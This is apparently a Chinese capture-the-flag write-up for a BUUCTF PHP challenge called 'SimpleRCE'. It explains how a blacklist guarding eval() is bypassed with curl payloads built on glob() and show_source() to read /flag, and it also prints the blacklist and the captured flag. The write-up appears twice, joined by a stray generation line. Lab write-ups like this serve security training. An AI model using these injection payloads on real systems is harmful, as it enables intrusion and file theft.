---
title: "[Dest0g3 520迎新赛]SimpleRCE"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-eval, blacklist-bypass, glob, show-source]
vulnerability: PHP eval黑名单绕过导致任意文件读取
solved: true
flag: "flag{65d54ff2-78ad-496e-b891-e2d98fe5a291}"

# [Dest0g3 520迎新赛]SimpleRCE

## 题目概述
PHP代码审计题，用户输入通过POST参数`aaa`传入，经过黑名单过滤后直接进入`eval()`执行。

## 信息收集
访问目标URL，页面直接显示源码：
```php
<?php
highlight_file(__FILE__);
$aaa=$_POST['aaa'];
$black_list=array('^','.','`','>','<','=','"','preg','&','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\','cut','bash','nl','wget','vi','grep');
$aaa = str_ireplace($black_list,"hacker",$aaa);
eval($aaa);
?>
```

## 漏洞分析
黑名单过滤了大量危险函数和符号：
- 命令执行：`system`, `exec`, `passthru`, `proc_open`, `popen`, `pcntl`
- 文件读取：`file`, `cat`, `tac`, `more`, `tail`, `cut`, `nl`, `grep`
- 关键字：`flag`, `scan`, `print`, `var`, `eval`, `assert`, `include`
- 符号：`$`, `{`, `}`, `.`, `>`, `<`, `=`, `"`, `&`, `|`, `+`, `\`

但以下函数未被过滤：
- `glob()` - 列目录
- `show_source()` - 读取并高亮文件
- `array_pop()` - 数组操作
- `join()` - 数组转字符串

## 利用过程

**第一步：列出根目录**
```bash
curl -s "http://target/" -X POST -d "aaa=echo join(glob('/*'));"
```
输出：`/bin/boot/dev/etc/flag/home/lib/lib64/media/mnt/opt/proc/root/run/sbin/srv/sys/tmp/usr/var`

发现 `/flag` 文件。

**第二步：读取flag文件**

由于`flag`关键字被过滤，使用`glob('/f*')`通配符绕过：
```bash
curl -s "http://target/" -X POST -d "aaa=show_source(array_pop(glob('/f*')));"
```

Payload分解：
- `glob('/f*')` - 匹配 `/f` 开头的文件（绕过flag关键字过滤）
- `array_pop()` - 取出最后一个匹配结果
- `show_source()` - 读取并显示文件内容

输出：`flag{65d54ff2-78ad-496e-b891-e2d98fe5a291}`

## 复现步骤
```bash
# 1. 列出根目录
curl -s "http://c1b850b7-640d-48c7-a6ff-fb0609a10007.node5.buuoj.cn:81/" \
  -X POST -d "aaa=echo join(glob('/*'));"

# 2. 读取flag
curl -s "http://c1b850b7-640d-48c7-a6ff-fb0609a10007.node5.buuoj.cn:81/" \
  -X POST -d "aaa=show_source(array_pop(glob('/f*')));"
```成功获取到 flag：`flag{65d54ff2-78ad-496e-b891-e2d98fe5a291}`

现在我来生成 writeup。

---

title: "[Dest0g3 520迎新赛]SimpleRCE"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-eval, blacklist-bypass, glob, show-source]
vulnerability: PHP eval黑名单绕过导致任意文件读取
solved: true
flag: "flag{65d54ff2-78ad-496e-b891-e2d98fe5a291}"

# [Dest0g3 520迎新赛]SimpleRCE

## 题目概述
PHP代码审计题，用户输入通过POST参数`aaa`传入，经过黑名单过滤后直接进入`eval()`执行。

## 信息收集
访问目标URL，页面直接显示源码：
```php
<?php
highlight_file(__FILE__);
$aaa=$_POST['aaa'];
$black_list=array('^','.','`','>','<','=','"','preg','&','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\','cut','bash','nl','wget','vi','grep');
$aaa = str_ireplace($black_list,"hacker",$aaa);
eval($aaa);
?>
```

## 漏洞分析
黑名单过滤了大量危险函数和符号：
- 命令执行：`system`, `exec`, `passthru`, `proc_open`, `popen`, `pcntl`
- 文件读取：`file`, `cat`, `tac`, `more`, `tail`, `cut`, `nl`, `grep`
- 关键字：`flag`, `scan`, `print`, `var`, `eval`, `assert`, `include`
- 符号：`$`, `{`, `}`, `.`, `>`, `<`, `=`, `"`, `&`, `|`, `+`, `\`

但以下函数未被过滤：
- `glob()` - 列目录
- `show_source()` - 读取并高亮文件
- `array_pop()` - 数组操作
- `join()` - 数组转字符串

## 利用过程

**第一步：列出根目录**
```bash
curl -s "http://target/" -X POST -d "aaa=echo join(glob('/*'));"
```
输出：`/bin/boot/dev/etc/flag/home/lib/lib64/media/mnt/opt/proc/root/run/sbin/srv/sys/tmp/usr/var`

发现 `/flag` 文件。

**第二步：读取flag文件**

由于`flag`关键字被过滤，使用`glob('/f*')`通配符绕过：
```bash
curl -s "http://target/" -X POST -d "aaa=show_source(array_pop(glob('/f*')));"
```

Payload分解：
- `glob('/f*')` - 匹配 `/f` 开头的文件（绕过flag关键字过滤）
- `array_pop()` - 取出最后一个匹配结果
- `show_source()` - 读取并显示文件内容

输出：`flag{65d54ff2-78ad-496e-b891-e2d98fe5a291}`

## 复现步骤
```bash
# 1. 列出根目录
curl -s "http://c1b850b7-640d-48c7-a6ff-fb0609a10007.node5.buuoj.cn:81/" \
  -X POST -d "aaa=echo join(glob('/*'));"

# 2. 读取flag
curl -s "http://c1b850b7-640d-48c7-a6ff-fb0609a10007.node5.buuoj.cn:81/" \
  -X POST -d "aaa=show_source(array_pop(glob('/f*')));"
```